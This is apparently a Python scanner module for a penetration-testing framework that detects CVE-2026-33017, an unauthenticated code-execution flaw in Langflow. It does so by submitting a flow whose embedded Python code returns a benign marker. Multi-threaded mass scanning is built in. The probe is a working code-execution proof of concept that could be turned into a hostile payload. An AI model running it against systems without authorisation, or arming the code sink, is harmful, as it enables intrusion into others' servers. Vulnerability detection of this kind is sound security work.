import json
import ssl
import time
import urllib.error
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

FLOW_PATH_TMPL = "/api/v1/build_public_tmp/{uuid}/flow"
MARKER = "METIS_33017_OK"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class LangflowCve202633017Scanner(Auxiliary):
    NAME = "Langflow build_public_tmp RCE Detection (CVE-2026-33017)"
    DESCRIPTION = (
        "Detects the unauthenticated code-execution sink in Langflow's "
        "/api/v1/build_public_tmp/{uuid}/flow endpoint. Submits a flow "
        "whose node template returns a benign marker; if the marker is "
        "reflected in the response the target is vulnerable."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-04-02"
    CHECK = True
    REFERENCES = [
        "CVE-2026-33017",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-33017",
        "https://www.sysdig.com/blog/cve-2026-33017",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=7860, type=int, description="Langflow HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        uid = str(uuid.uuid4())
        url = self._base(host) + FLOW_PATH_TMPL.format(uuid=uid)
        ctx = ssl._create_unverified_context()
        payload = {
            "data": {
                "nodes": [{
                    "data": {
                        "node": {
                            "template": {
                                "code": {
                                    "value": (
                                        "def function():\n"
                                        "    return \"" + MARKER + "\"\n"
                                    )
                                }
                            }
                        }
                    }
                }]
            }
        }
        body = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                text = r.read().decode(errors="replace"); status = r.status
        except urllib.error.HTTPError as e:
            text = e.read().decode(errors="replace"); status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if MARKER in text:
            return HostResult(host, "vulnerable", "marker reflected in build response")
        if status == 404:
            return HostResult(host, "safe", "endpoint not found")
        return HostResult(host, "safe", "HTTP " + str(status) + " without marker")

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Langflow")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-33017", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host) + "/api/v1/build_public_tmp/..."))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
